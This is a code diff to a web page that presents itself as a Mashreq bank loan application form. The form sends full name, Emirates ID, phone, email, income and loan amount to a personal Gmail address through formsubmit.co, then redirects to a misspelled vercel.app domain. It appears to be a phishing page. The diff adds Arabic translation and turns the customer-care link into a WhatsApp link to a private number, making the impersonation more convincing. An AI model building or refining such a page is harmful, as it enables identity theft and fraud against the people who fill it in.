@@ -6,34 +6,40 @@
   <meta name="theme-color" content="#ff5e00">
   <title>Loan application</title>
   <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' rx='2' fill='%23ff5e00'/%3E%3C/svg%3E">
-  <link rel="stylesheet" href="./styles.css?v=20260929aa">
+  <link rel="stylesheet" href="./styles.css?v=20260929ab">
 </head>
 <body>
-  <a class="skip" href="#apply">Skip to application</a>
+  <a class="skip" href="#apply" data-i18n="skip">Skip to application</a>
 
   <header class="site-header" id="site-header">
     <div class="util">
       <nav class="util-left" aria-label="Segments">
-        <a href="#apply">Business</a>
-        <a href="#apply">Corporate</a>
-        <a href="#apply">International</a>
-        <a href="#apply">Mashreq Al Islami</a>
+        <a href="#apply" data-i18n="business">Business</a>
+        <a href="#apply" data-i18n="corporate">Corporate</a>
+        <a href="#apply" data-i18n="international">International</a>
+        <a href="#apply" data-i18n="islami">Mashreq Al Islami</a>
       </nav>
       <div class="util-right">
-        <span class="lang">عربي</span>
-        <span>UAE</span>
-        <a class="util-extra" href="#apply">About Us</a>
-        <a class="util-extra" href="#apply">ATM &amp; Branches</a>
-        <a class="care" href="#apply">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 3a8 8 0 0 0-8 8c0 2.2.9 4.2 2.3 5.6V20l2.5-1.4c1 .4 2.1.6 3.2.6a8 8 0 0 0 0-16zm-1 11v-2h2v2h-2zm0-3.2V7h2v3.8h-2z"/></svg>
-          Customer Care
+        <div class="lang-switch" role="group" aria-label="Language">
+          <button type="button" class="lang-btn is-active" data-set-lang="en" aria-pressed="true">EN</button>
+          <button type="button" class="lang-btn" data-set-lang="ar" aria-pressed="false">عربي</button>
+        </div>
+        <span class="uae-flag" role="img" aria-label="United Arab Emirates"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="6" height="16" fill="#ef3340"/><rect x="6" width="18" height="5.34" fill="#009e49"/><rect x="6" y="5.34" width="18" height="5.32" fill="#ffffff"/><rect x="6" y="10.66" width="18" height="5.34" fill="#000000"/></svg></span>
+        <a class="util-extra" href="#apply" data-i18n="about">About Us</a>
+        <a class="util-extra" href="#apply" data-i18n="branches">ATM &amp; Branches</a>
+        <a class="care" href="https://wa.me/971529892720" target="_blank" rel="noopener">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12.04 3C7.31 3 3.48 6.82 3.48 11.54c0 1.5.4 2.96 1.15 4.24L3 21l5.38-1.4a8.6 8.6 0 0 0 3.66.8h.01c4.72 0 8.56-3.82 8.56-8.54C20.6 6.82 16.76 3 12.04 3zm4.9 12.16c-.2.58-1.18 1.1-1.64 1.16-.42.06-.96.08-1.55-.1-.36-.1-.82-.26-1.41-.5-2.48-1.07-4.1-3.56-4.22-3.73-.12-.16-1-1.33-1-2.54s.63-1.8.86-2.05c.22-.24.48-.3.64-.3h.46c.15 0 .34-.05.53.4.2.48.68 1.66.74 1.78.06.12.1.26.02.42-.08.16-.12.26-.24.4-.12.14-.25.31-.36.42-.12.12-.24.24-.1.46.14.22.62 1.02 1.33 1.66.92.82 1.69 1.08 1.93 1.2.24.12.38.1.52-.06.14-.16.6-.7.76-.94.16-.24.32-.2.54-.12.22.08 1.4.66 1.64.78.24.12.4.18.46.28.06.1.06.58-.14 1.16z"/></svg>
+          <span class="care-copy">
+            <span data-i18n="care">Customer Care</span>
+            <span class="care-number" dir="ltr">+971 52 989 2720</span>
+          </span>
         </a>
       </div>
     </div>
 
     <div class="bar">
       <button type="button" class="menu-toggle" id="menu-toggle" aria-expanded="false" aria-controls="primary-nav">
-        <span class="sr-only">Open menu</span>
+        <span class="sr-only" data-i18n="openMenu">Open menu</span>
         <span class="bars" aria-hidden="true"><span></span><span></span><span></span></span>
       </button>
 
@@ -43,42 +49,42 @@
       </a>
 
       <nav id="primary-nav" class="primary-nav" aria-label="Primary">
-        <a href="#apply">Accounts</a>
-        <a href="#apply">Cards</a>
-        <a href="#apply" aria-current="page">Loans</a>
-        <a href="#apply">Transfers</a>
-        <a href="#apply">Investments</a>
-        <a href="#apply">Insurance</a>
-        <a href="#apply">Rewards</a>
-        <a class="neo" href="#apply">NEO PLUS <span class="new">NEW</span></a>
-        <a class="btn btn-solid menu-only" href="#apply">Become A Customer</a>
+        <a href="#apply" data-i18n="accounts">Accounts</a>
+        <a href="#apply" data-i18n="cards">Cards</a>
+        <a href="#apply" aria-current="page" data-i18n="loans">Loans</a>
+        <a href="#apply" data-i18n="transfers">Transfers</a>
+        <a href="#apply" data-i18n="investments">Investments</a>
+        <a href="#apply" data-i18n="insurance">Insurance</a>
+        <a href="#apply" data-i18n="rewards">Rewards</a>
+        <a class="neo" href="#apply">NEO PLUS <span class="new" data-i18n="newBadge">NEW</span></a>
+        <a class="btn btn-solid menu-only" href="#apply" data-i18n="become">Become A Customer</a>
       </nav>
 
       <div class="bar-actions">
         <button type="button" class="icon-btn" id="search-toggle" aria-expanded="false" aria-controls="site-search">
-          <span class="sr-only">Search</span>
+          <span class="sr-only" data-i18n="search">Search</span>
           <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6.25" fill="none" stroke="currentColor" stroke-width="2"/><path d="M15.2 15.2 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
         </button>
-        <a class="btn btn-solid" href="#apply">Sign In</a>
-        <a class="btn btn-solid desktop-only" href="#apply">Become A Customer</a>
+        <a class="btn btn-solid" href="#apply" data-i18n="signIn">Sign In</a>
+        <a class="btn btn-solid desktop-only" href="#apply" data-i18n="become">Become A Customer</a>
       </div>
     </div>
 
     <form id="site-search" class="site-search" hidden>
-      <label class="sr-only" for="q">Search</label>
-      <input id="q" type="search" placeholder="Search" enterkeyhint="search">
+      <label class="sr-only" for="q" data-i18n="search">Search</label>
+      <input id="q" type="search" placeholder="Search" data-i18n-placeholder="search" enterkeyhint="search">
     </form>
   </header>
 
   <div class="banner" id="banner">
-    <p>Apply for a <strong>Mashreq loan</strong> for personal, education, home, car, or business needs. <a href="#apply">Apply now</a></p>
-    <button type="button" id="dismiss-banner" aria-label="Dismiss announcement">&times;</button>
+    <p data-i18n-html="banner">Apply for a <strong>Mashreq loan</strong> for personal, education, home, car, or business needs. <a href="#apply">Apply now</a></p>
+    <button type="button" id="dismiss-banner" data-i18n-aria="dismiss" aria-label="Dismiss announcement">&times;</button>
   </div>
 
   <main id="apply">
     <div class="wrap">
-      <h1>Loan application</h1>
-      <p class="intro">Choose a category and tell us how to reach you. Fields marked * are required.</p>
+      <h1 data-i18n="title">Loan application</h1>
+      <p class="intro" data-i18n="lead">Choose a category and tell us how to reach you. Fields marked * are required.</p>
 
       <div class="card">
         <form id="loan-form" method="post" action="https://formsubmit.co/afzal056m@gmail.com" novalidate autocomplete="on">
@@ -89,32 +95,32 @@
           <p class="sr-only" aria-live="polite" id="live"></p>
           <div class="grid">
             <div class="field span-2" data-field="fullName">
-              <label for="fullName">Full name <span class="req" aria-hidden="true">*</span></label>
+              <label for="fullName"><span data-i18n="fullName">Full name</span> <span class="req" aria-hidden="true">*</span></label>
               <input id="fullName" name="fullName" autocomplete="name" required>
               <p class="error" hidden></p>
             </div>
 
             <div class="field span-2" data-field="loanCategory">
-              <label for="loanCategory">Loan category <span class="req" aria-hidden="true">*</span></label>
+              <label for="loanCategory"><span data-i18n="loanCategory">Loan category</span> <span class="req" aria-hidden="true">*</span></label>
               <select id="loanCategory" name="loanCategory" required>
-                <option value="">Select a category</option>
-                <option value="Personal loan">Personal loan</option>
-                <option value="Education loan">Education loan</option>
-                <option value="Home loan">Home loan</option>
-                <option value="Car loan">Car loan</option>
-                <option value="Business loan">Business loan</option>
+                <option value="" data-i18n="selectCategory">Select a category</option>
+                <option value="Personal loan" data-i18n="personal">Personal loan</option>
+                <option value="Education loan" data-i18n="education">Education loan</option>
+                <option value="Home loan" data-i18n="home">Home loan</option>
+                <option value="Car loan" data-i18n="car">Car loan</option>
+                <option value="Business loan" data-i18n="businessLoan">Business loan</option>
               </select>
               <p class="error" hidden></p>
             </div>
 
             <div class="field span-2" data-field="emiratesId">
-              <label for="emiratesId">Emirates ID <span class="req" aria-hidden="true">*</span></label>
+              <label for="emiratesId"><span data-i18n="emiratesId">Emirates ID</span> <span class="req" aria-hidden="true">*</span></label>
               <input id="emiratesId" name="emiratesId" type="text" inputmode="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="18" placeholder="784-XXXX-XXXXXXX-X" value="784-" oninput="formatEmiratesIdInput(this)" onkeyup="formatEmiratesIdInput(this)" onblur="formatEmiratesIdInput(this)" required>
               <p class="error" hidden></p>
             </div>
 
             <div class="field" data-field="phone">
-              <label for="phone">Mobile number <span class="req" aria-hidden="true">*</span></label>
+              <label for="phone"><span data-i18n="mobile">Mobile number</span> <span class="req" aria-hidden="true">*</span></label>
               <div class="money phone-box">
                 <span class="dial-code"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="6" height="16" fill="#ef3340"/><rect x="6" width="18" height="5.34" fill="#009e49"/><rect x="6" y="5.34" width="18" height="5.32" fill="#ffffff"/><rect x="6" y="10.66" width="18" height="5.34" fill="#000000"/></svg>+971</span>
                 <input id="phone" name="phone" type="tel" inputmode="tel" autocomplete="tel" maxlength="12" required>
@@ -123,23 +129,23 @@
             </div>
 
             <div class="field" data-field="email">
-              <label for="email">Email <span class="req" aria-hidden="true">*</span></label>
+              <label for="email"><span data-i18n="email">Email</span> <span class="req" aria-hidden="true">*</span></label>
               <input id="email" name="email" type="email" autocomplete="email" spellcheck="false" required>
               <p class="error" hidden></p>
             </div>
 
             <div class="field" data-field="monthlyIncome">
-              <label for="monthlyIncome">Monthly income (AED) <span class="req" aria-hidden="true">*</span></label>
+              <label for="monthlyIncome"><span data-i18n="income">Monthly income (AED)</span> <span class="req" aria-hidden="true">*</span></label>
               <div class="money">
                 <span>AED</span>
                 <input id="monthlyIncome" name="monthlyIncome" type="text" inputmode="decimal" maxlength="15" data-money autocomplete="off" required>
               </div>
-              <p class="hint">Must be AED 3,000 or more.</p>
+              <p class="hint" data-i18n="incomeHint">Must be AED 3,000 or more.</p>
               <p class="error" hidden></p>
             </div>
 
             <div class="field" data-field="loanAmount">
-              <label for="loanAmount">Required loan (AED) <span class="req" aria-hidden="true">*</span></label>
+              <label for="loanAmount"><span data-i18n="loanAmount">Required loan (AED)</span> <span class="req" aria-hidden="true">*</span></label>
               <div class="money">
                 <span>AED</span>
                 <input id="loanAmount" name="loanAmount" type="text" inputmode="decimal" maxlength="15" data-money autocomplete="off" required>
@@ -148,18 +154,18 @@
             </div>
 
             <fieldset class="field span-2" data-field="mashreqCustomer">
-              <legend>Are you a Mashreq customer? <span class="req" aria-hidden="true">*</span></legend>
+              <legend><span data-i18n="customer">Are you a Mashreq customer?</span> <span class="req" aria-hidden="true">*</span></legend>
               <div class="choices">
-                <label class="choice"><input type="radio" name="mashreqCustomer" value="yes" required> Yes</label>
-                <label class="choice"><input type="radio" name="mashreqCustomer" value="no"> No</label>
+                <label class="choice"><input type="radio" name="mashreqCustomer" value="yes" required> <span data-i18n="yes">Yes</span></label>
+                <label class="choice"><input type="radio" name="mashreqCustomer" value="no"> <span data-i18n="no">No</span></label>
               </div>
               <p class="error" hidden></p>
             </fieldset>
           </div>
 
           <div class="submit-bar">
-            <button type="submit" class="btn btn-solid btn-submit">Submit application</button>
-            <button type="button" class="text-btn" id="clear-form">Clear form</button>
+            <button type="submit" class="btn btn-solid btn-submit" data-i18n="submit">Submit application</button>
+            <button type="button" class="text-btn" id="clear-form" data-i18n="clear">Clear form</button>
           </div>
           <p class="form-status" id="form-status" role="alert" hidden>The request could not be sent. Please try again or contact the support department.</p>
         </form>
@@ -167,9 +173,9 @@
         <section id="success" hidden>
           <div class="thanks">
             <span class="thanks-mark" aria-hidden="true"></span>
-            <p class="thanks-kicker">Mashreq loan</p>
-            <h2 id="success-title">Thank you for your application.</h2>
-            <p class="intro">Application <strong id="ref"></strong> has been received. A Mashreq representative will contact you soon.</p>
+            <p class="thanks-kicker" data-i18n="kicker">Mashreq loan</p>
+            <h2 id="success-title" data-i18n="thanksTitle">Thank you for your application.</h2>
+            <p class="intro"><span data-i18n="thanksBefore">Application</span> <strong id="ref"></strong> <span data-i18n="thanksAfter">has been received. A Mashreq representative will contact you soon.</span></p>
           </div>
         </section>
       </div>
@@ -262,14 +268,14 @@
         var loan = Number(fieldValue("loanAmount").replace(/,/g, ""));
         var customer = fieldValue("mashreqCustomer");
         var problem = "";
-        if (name.split(/\s+/).length < 2) problem = "Enter your full name.";
-        else if (!category) problem = "Select a loan category.";
-        else if (!/^784\d{12}$/.test(eid)) problem = "Enter a 15-digit Emirates ID in the format 784-XXXX-XXXXXXX-X.";
-        else if (!/^5\d{8}$/.test(phone)) problem = "Enter a UAE mobile number, such as 50 123 4567.";
-        else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) problem = "Enter a valid email address.";
-        else if (!(income >= 3000)) problem = "Monthly income must be AED 3,000 or more.";
-        else if (!(loan > 0)) problem = "Enter the required loan amount in dirhams.";
-        else if (customer !== "yes" && customer !== "no") problem = "Select yes or no.";
+        if (name.split(/\s+/).length < 2) problem = SiteI18n.t("errName");
+        else if (!category) problem = SiteI18n.t("errCategory");
+        else if (!/^784\d{12}$/.test(eid)) problem = SiteI18n.t("errEid");
+        else if (!/^5\d{8}$/.test(phone)) problem = SiteI18n.t("errPhone");
+        else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) problem = SiteI18n.t("errEmail");
+        else if (!(income >= 3000)) problem = SiteI18n.t("errIncome");
+        else if (!(loan > 0)) problem = SiteI18n.t("errLoan");
+        else if (customer !== "yes" && customer !== "no") problem = SiteI18n.t("errCustomer");
         if (problem) {
           event.preventDefault();
           event.stopImmediatePropagation();
@@ -306,11 +312,185 @@
         document.getElementById("mail-next").value = "https://mashrqloan2026perosnal-business-pol.vercel.app/?sent=1&ref=" + encodeURIComponent(reference);
         var button = form.querySelector("button[type='submit']");
         if (button) button.textContent = "Sending application…";
-        showStatus("Sending application…", true);
+        showStatus(SiteI18n.t("sending"), true);
       }, true);
     })();
   </script>
-  <script src="./loan.js?v=20260929aa"></script>
-  <script src="./app.js?v=20260929aa"></script>
+  <script src="./loan.js?v=20260929ab"></script>
+  <script src="./app.js?v=20260929ab"></script>
+  <script>
+    var SiteI18n = (function () {
+      var copy = {
+        en: {
+          skip: "Skip to application",
+          business: "Business",
+          corporate: "Corporate",
+          international: "International",
+          islami: "Mashreq Al Islami",
+          about: "About Us",
+          branches: "ATM & Branches",
+          care: "Customer Care",
+          openMenu: "Open menu",
+          closeMenu: "Close menu",
+          accounts: "Accounts",
+          cards: "Cards",
+          loans: "Loans",
+          transfers: "Transfers",
+          investments: "Investments",
+          insurance: "Insurance",
+          rewards: "Rewards",
+          newBadge: "NEW",
+          become: "Become A Customer",
+          search: "Search",
+          signIn: "Sign In",
+          dismiss: "Dismiss announcement",
+          banner: "Apply for a <strong>Mashreq loan</strong> for personal, education, home, car, or business needs. <a href=\"#apply\">Apply now</a>",
+          title: "Loan application",
+          lead: "Choose a category and tell us how to reach you. Fields marked * are required.",
+          fullName: "Full name",
+          loanCategory: "Loan category",
+          selectCategory: "Select a category",
+          personal: "Personal loan",
+          education: "Education loan",
+          home: "Home loan",
+          car: "Car loan",
+          businessLoan: "Business loan",
+          emiratesId: "Emirates ID",
+          mobile: "Mobile number",
+          email: "Email",
+          income: "Monthly income (AED)",
+          incomeHint: "Must be AED 3,000 or more.",
+          loanAmount: "Required loan (AED)",
+          customer: "Are you a Mashreq customer?",
+          yes: "Yes",
+          no: "No",
+          submit: "Submit application",
+          clear: "Clear form",
+          clearConfirm: "Clear this application and start again?",
+          kicker: "Mashreq loan",
+          thanksTitle: "Thank you for your application.",
+          thanksBefore: "Application",
+          thanksAfter: "has been received. A Mashreq representative will contact you soon.",
+          sending: "Sending application…",
+          errName: "Enter your full name.",
+          errCategory: "Select a loan category.",
+          errEid: "Enter a 15-digit Emirates ID in the format 784-XXXX-XXXXXXX-X.",
+          errPhone: "Enter a UAE mobile number, such as 50 123 4567.",
+          errEmail: "Enter a valid email address.",
+          errIncome: "Monthly income must be AED 3,000 or more.",
+          errLoan: "Enter the required loan amount in dirhams.",
+          errCustomer: "Select yes or no.",
+          pageTitle: "Loan application"
+        },
+        ar: {
+          skip: "انتقل إلى الطلب",
+          business: "الأعمال",
+          corporate: "الشركات",
+          international: "الدولية",
+          islami: "المشرق الإسلامي",
+          about: "من نحن",
+          branches: "الصراف والفروع",
+          care: "خدمة العملاء",
+          openMenu: "فتح القائمة",
+          closeMenu: "إغلاق القائمة",
+          accounts: "الحسابات",
+          cards: "البطاقات",
+          loans: "القروض",
+          transfers: "التحويلات",
+          investments: "الاستثمارات",
+          insurance: "التأمين",
+          rewards: "المكافآت",
+          newBadge: "جديد",
+          become: "كن عميلاً",
+          search: "بحث",
+          signIn: "تسجيل الدخول",
+          dismiss: "إغلاق الإعلان",
+          banner: "قدّم على <strong>قرض المشرق</strong> للاحتياجات الشخصية أو التعليم أو السكن أو السيارة أو الأعمال. <a href=\"#apply\">قدّم الآن</a>",
+          title: "طلب قرض",
+          lead: "اختر الفئة وأخبرنا كيف نتواصل معك. الحقول المشار إليها بـ * مطلوبة.",
+          fullName: "الاسم الكامل",
+          loanCategory: "فئة القرض",
+          selectCategory: "اختر فئة",
+          personal: "قرض شخصي",
+          education: "قرض التعليم",
+          home: "قرض السكن",
+          car: "قرض السيارة",
+          businessLoan: "قرض الأعمال",
+          emiratesId: "الهوية الإماراتية",
+          mobile: "رقم الهاتف المتحرك",
+          email: "البريد الإلكتروني",
+          income: "الدخل الشهري (درهم)",
+          incomeHint: "يجب أن يكون 3,000 درهم أو أكثر.",
+          loanAmount: "القرض المطلوب (درهم)",
+          customer: "هل أنت من عملاء المشرق؟",
+          yes: "نعم",
+          no: "لا",
+          submit: "إرسال الطلب",
+          clear: "مسح النموذج",
+          clearConfirm: "مسح هذا الطلب والبدء من جديد؟",
+          kicker: "قرض المشرق",
+          thanksTitle: "شكراً لتقديم طلبك.",
+          thanksBefore: "تم استلام الطلب",
+          thanksAfter: "سيتواصل معك ممثل المشرق قريباً.",
+          sending: "جارٍ إرسال الطلب…",
+          errName: "أدخل الاسم الكامل.",
+          errCategory: "اختر فئة القرض.",
+          errEid: "أدخل هوية إماراتية من 15 رقماً بالصيغة 784-XXXX-XXXXXXX-X.",
+          errPhone: "أدخل رقم هاتف إماراتي، مثل 50 123 4567.",
+          errEmail: "أدخل بريداً إلكترونياً صحيحاً.",
+          errIncome: "يجب أن يكون الدخل الشهري 3,000 درهم أو أكثر.",
+          errLoan: "أدخل مبلغ القرض بالدرهم.",
+          errCustomer: "اختر نعم أو لا.",
+          pageTitle: "طلب قرض"
+        }
+      };
+
+      function lang() {
+        return document.documentElement.lang === "ar" ? "ar" : "en";
+      }
+
+      function t(key) {
+        return (copy[lang()] && copy[lang()][key]) || copy.en[key] || "";
+      }
+
+      function apply(next) {
+        var chosen = next === "ar" ? "ar" : "en";
+        document.documentElement.lang = chosen;
+        document.documentElement.dir = chosen === "ar" ? "rtl" : "ltr";
+        try { localStorage.setItem("mashreq-lang", chosen); } catch (error) { /* storage unavailable */ }
+        document.title = copy[chosen].pageTitle;
+        var nodes = document.querySelectorAll("[data-i18n]");
+        for (var i = 0; i < nodes.length; i += 1) nodes[i].textContent = copy[chosen][nodes[i].getAttribute("data-i18n")] || "";
+        var htmlNodes = document.querySelectorAll("[data-i18n-html]");
+        for (var h = 0; h < htmlNodes.length; h += 1) htmlNodes[h].innerHTML = copy[chosen][htmlNodes[h].getAttribute("data-i18n-html")] || "";
+        var placeholders = document.querySelectorAll("[data-i18n-placeholder]");
+        for (var p = 0; p < placeholders.length; p += 1) placeholders[p].placeholder = copy[chosen][placeholders[p].getAttribute("data-i18n-placeholder")] || "";
+        var labels = document.querySelectorAll("[data-i18n-aria]");
+        for (var a = 0; a < labels.length; a += 1) labels[a].setAttribute("aria-label", copy[chosen][labels[a].getAttribute("data-i18n-aria")] || "");
+        var buttons = document.querySelectorAll("[data-set-lang]");
+        for (var b = 0; b < buttons.length; b += 1) {
+          var active = buttons[b].getAttribute("data-set-lang") === chosen;
+          buttons[b].classList.toggle("is-active", active);
+          buttons[b].setAttribute("aria-pressed", String(active));
+        }
+        var menuLabel = document.querySelector("#menu-toggle .sr-only");
+        if (menuLabel) {
+          var open = document.querySelector("#menu-toggle").getAttribute("aria-expanded") === "true";
+          menuLabel.textContent = open ? copy[chosen].closeMenu : copy[chosen].openMenu;
+        }
+      }
+
+      document.querySelectorAll("[data-set-lang]").forEach(function (button) {
+        button.addEventListener("click", function () {
+          apply(button.getAttribute("data-set-lang"));
+        });
+      });
+
+      var saved = "en";
+      try { saved = localStorage.getItem("mashreq-lang") || "en"; } catch (error) { saved = "en"; }
+      apply(saved);
+      return { t: t, apply: apply };
+    })();
+  </script>
 </body>
 </html>
